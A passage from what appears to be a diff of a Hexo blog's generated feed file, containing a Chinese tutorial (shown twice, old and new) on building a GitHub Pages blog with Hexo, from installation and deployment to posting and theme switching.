page网页即可，即网址<code>https://&lt;用户名&gt;.github.io</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700814.png" alt="image-20240505144127778"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700127.png" alt="image-20240505144240827"></p><h1 id="四、发布文章"><a href="#四、发布文章" class="headerlink" title="四、发布文章"></a>四、发布文章</h1><p>进入博客所在目录执行命令:</p><blockquote><p>hexo new “&lt;文章名称&gt;”</p></blockquote><p>新建的文章的<code>.md</code>文件会被保存在<code>根目录/sorce/_posts/</code>下面，将文章内容写入<code>.md</code>文件中，再次生成页面，上传到github上即可</p><blockquote><p>hexo clean#清理</p><p>hexo g</p><p>hexo d</p></blockquote><h1 id="五、hexo模板主题切换"><a href="#五、hexo模板主题切换" class="headerlink" title="五、hexo模板主题切换"></a>五、hexo模板主题切换</h1><ol><li>选择自己喜欢的主题</li></ol><p>主题网址：<a href="https://hexo.io/themes/">Themes | Hexo</a></p><p>以下选择主题<a href="https://github.com/saicaca/hexo-theme-vivia">saicaca&#x2F;hexo-theme-vivia: A clean and minimalist theme for Hexo. (github.com)</a>举例安装主题</p><p>每个主题的安装方式都类似，但又有细微的差距，差距来源于他们的依赖以及插件的不同。</p><ol start="2"><li>阅读安装步骤</li></ol><p>每个主题都会列有相应的安装步骤，教你怎么装，跟着装就是了</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700723.png" alt="image-20240422161014628"></p><p>例如，上述主题的安装步骤</p><p>我推荐直接下载源代码，然后将源代码解压，放置到相应的hexo文件夹的themes文件夹下即可。</p><p>因为git clone命令不稳定，导致有时候下载不成功。npm下载嘛，没试过，因为不确定它会把主题下到哪儿去。</p><blockquote><p>进入hexo的博客文件夹执行下方命令即可。</p><p>git clone <a href="https://github.com/saicaca/hexo-theme-vivia.git">https://github.com/saicaca/hexo-theme-vivia.git</a> themes&#x2F;vivia7(存在名字可以做更改)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700897.png" alt="image-20240422161529504"></p><ol start="3"><li>安装相关依赖</li></ol><p>有些主题并不需要安装相关依赖，有些则需要，所以根据主题的要求进行安装即可，示例主题需要通过下方命令安装依赖，则在根目录执行下方命令即可。</p><blockquote><p>npm install colorjs.io stylus hexo-symbols-count-time</p></blockquote><ol start="3"><li>切换主题</li></ol><p>打开博客文件夹根目录下的<code>_config.yml</code>文件，对其中的<code>theme</code>字段的值进行修改，修改为刚才下载主题存储在themes文件夹下的主题文件夹的名称<code>hexo-theme-vivia</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061701077.png" alt="image-20240422161736726"></p><p>另外，修改<code>language</code>字段的值为<code>zh-CN</code>，将语言切换到中文。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061701498.png" alt="image-20240422161833753"></p><ol start="6"><li>再次部署博客即可</li></ol><blockquote><p>hexo g &amp;&amp; hexo clean &amp;&amp; hexo d</p></blockquote><p>注意：有些主题可能存在问题，自己再换一个就是啦。</p><p>最后最后，可能你想问，那我怎么修改主题中的各种文本和加标签呢？</p><p>答案：对主题的<code>.yml</code>文件或者根目录自带的<code>_config.yml</code>进行修改，达到自己想要的效果，可以参考官方文档<a href="https://hexo.io/zh-cn/docs/configuration">配置 | Hexo</a>，或者各位大佬的博客。</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="一、环境安装"><a href="#一、环境安装" class="headerlink" title="一、环境安装"></a>一、环境安装</h1><h2 id="1-1-必备环境安装"><a href="#1-1-必备环境安装" class="headerlink" title="1.1 必备环境安装"></a>1.1 必备环境安装</h2><p><a href="https://nodejs.org/en/">Node.js — Run JavaScript Everywhere (nodejs.org)</a></p><p><a href="https://git-scm.com/downloads">Git - Downloads (git-scm.com)</a></p><p>这是必备的两个基本环境，请先安装这两个基本环境，网上均有教程，请参考其他教程进行安装</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659772.png" alt="image-20240505141421146"></p><p>运行这三条指令能够出现相应的版本号即可，不要求版本号相同。</p><h1 id="二、github-io仓库创建"><a href="#二、github-io仓库创建" class="headerlink" title="二、github.io仓库创建"></a>二、github.io仓库创建</h1><p>创建github page仓库的仓库名规则<code>&lt;用户名&gt;.github.io</code>如下图所示，并选择公开项目。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659455.png" alt="image-20240505141654227"></p><p>点击Actions，查看页面运行状态，等待其成功运行部署，这个过程可能会有点漫长可以稍等1分钟左右</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659541.png" alt="image-20240505141919262"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700350.png" alt="image-20240505141957864"></p><p>成功运行后，通过访问<code>https://&lt;用户名&gt;.github.io</code>基于访问看到基础页面。（如果报错，可以删除仓库重复上述过程，或者寻找其他大佬的文章解决错误）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700191.png" alt="image-20240505142102518"></p><p>这样初步的界面就已经搭建出来了，具有前端知识的大佬可以传自己的博客模板到新建的仓库即可看到自己的博客了，我这样的鼠鼠还得通过hexo去使用模板</p><h1 id="三、上传博客模板"><a href="#三、上传博客模板" class="headerlink" title="三、上传博客模板"></a>三、上传博客模板</h1><h2 id="3-1-安装Hexo"><a href="#3-1-安装Hexo" class="headerlink" title="3.1 安装Hexo"></a>3.1 安装Hexo</h2><p>使用 npm 一键安装 Hexo 博客程序：（此为全局安装命令，一般也推荐全局安装，局部安装我也没搞懂）</p><blockquote><p>npm install -g hexo-cli</p></blockquote><h2 id="3-2-Hexo本地"><a href="#3-2-Hexo本地" class="headerlink" title="3.2 Hexo本地"></a>3.2 Hexo本地</h2><p>首先在自己想要的地方创建一个空文件夹来初始化hexo</p><blockquote><p>hexo init      # 初始化<br>npm install    # 安装组件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700645.png" alt="image-20240505142944417"></p><p>完成上述初始化后，在继续执行下方指令生成页面也本地预览，访问本地网址<a href="http://localhost:4000/">http://localhost:4000/</a></p><blockquote><p>hexo g   # 生成页面<br>hexo s   # 启动预览</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700266.png" alt="image-20240505143118833"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700068.png" alt="image-20240505143129696"></p><p>至此，本地hexo已经成功，我们将我们生成的模板上传到自己的github.io仓库中，即可实现访问我们的github page得到相应的博客模板</p><h2 id="3-3-部署到github"><a href="#3-3-部署到github" class="headerlink" title="3.3 部署到github"></a>3.3 部署到github</h2><p>修改刚才我们初始化hexo文件中的<code>_config.yml</code>文件中最后的配置</p><blockquote><p>deploy:</p><p>type: git</p><p>repo: <a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#109;">&#x67;&#105;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#109;</a>:&lt;用户名&gt;&#x2F;&lt;用户名&gt;.github.io.git </p><p>branch: main(这个分支根据自己的主分支进行修改，有的人是master)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700501.png" alt="image-20240505150515357"></p><p>修改保存退出，然后再命令行执行指令</p><blockquote><p>npm install hexo-deployer-git –save</p><p>hexo d</p></blockquote><p>再次等待Actions运行成功，这个过程稍微一点漫长，成功后，访问我们的github page网页即可，即网址<code>https://&lt;用户名&gt;.github.io</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700814.png" alt="image-20240505144127778"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700127.png" alt="image-20240505144240827"></p><h1 id="四、发布文章"><a href="#四、发布文章" class="headerlink" title="四、发布文章"></a>四、发布文章</h1><p>进入博客所在目录执行命令:</p><blockquote><p>hexo new “&lt;文章名称&gt;”</p></blockquote><p>新建的文章的<code>.md</code>文件会被保存在<code>根目录/sorce/_posts/</code>下面，将文章内容写入<code>.md</code>文件中，再次生成页面，上传到github上即可</p><blockquote><p>hexo clean#清理</p><p>hexo g</p><p>hexo d</p></blockquote><h1 id="五、hexo模板主题切换"><a href="#五、hexo模板主题切换" class="headerlink" title="五、hexo模板主题切换"></a>五、hexo模板主题切换</h1><ol><li>选择自己喜欢的主题</li></ol><p>主题网址：<a href="https://hexo.io/themes/">Themes | Hexo</a></p><p>以下选择主题<a href="https://github.com/saicaca/hexo-theme-vivia">saicaca&#x2F;hexo-theme-vivia: A clean and minimalist theme for Hexo. (github.com)</a>举例安装主题</p><p>每个主题的安装方式都类似，但又有细微的差距，差距来源于他们的依赖以及插件的不同。</p><ol start="2"><li>阅读安装步骤</li></ol><p>每个主题都会列有相应的安装步骤，教你怎么装，跟着装就是了</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700723.png" alt="image-20240422161014628"></p><p>例如，上述主题的安装步骤</p><p>我推荐直接下载源代码，然后将源代码解压，放置到相应的hexo文件夹的themes文件夹下即可。</p><p>因为git clone命令不稳定，导致有时候下载不成功。npm下载嘛，没试过，因为不确定它会把主题下到哪儿去。</p><blockquote><p>进入hexo的博客文件夹执行下方命令即可。</p><p>git clone <a href="https://github.com/saicaca/hexo-theme-vivia.git">https://github.com/saicaca/hexo-theme-vivia.git</a> themes&#x2F;vivia7(存在名字可以做更改)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700897.png" alt="image-20240422161529504"></p><ol start="3"><li>安装相关依赖</li></ol><p>有些主题并不需要安装相关依赖，有些则需要，所以根据主题的要求进行安装即可，示例主题需要通过下方命令安装依赖，则在根目录执行下方命令即可。</p><blockquote><p>npm install colorjs.io stylus hexo-symbols-count-time</p></blockquote><ol start="3"><li>切换主题</li></ol><p>打开博客文件夹根目录下的<code>_config.yml</code>文件，对其中的<code>theme</code>字段的值进行修改，修改为刚才下载主题存储在themes文件夹下的主题文件夹的名称<code>hexo-theme-vivia</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061701077.png" alt="image-20240422161736726"></p><p>另外，修改<code>language</code>字段的值为<code>zh-CN</code>，将语言切换到中文。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061701498.png" alt="image-20240422161833753"></p><ol start="6"><li>再次部署博客即可</li></ol><blockquote><p>hexo g &amp;&amp; hexo clean &amp;&amp; hexo d</p></blockquote><p>注意：有些主题可能存在问题，自己再换一个就是啦。</p><p>最后最后，可能你想问，那我怎么修改主题中的各种文本和加标签呢？</p><p>答案：对主题的<code>.yml</code>文件或者根目录自带的<code>_config.yml</code>进行修改，达到自己想要的效果，可以参考官方文档<a href="https://hexo.io/zh-cn/docs/configuration">配置 | Hexo</a>，或者各位大佬的博客。</p>]]></content>
     
     
     <categories>
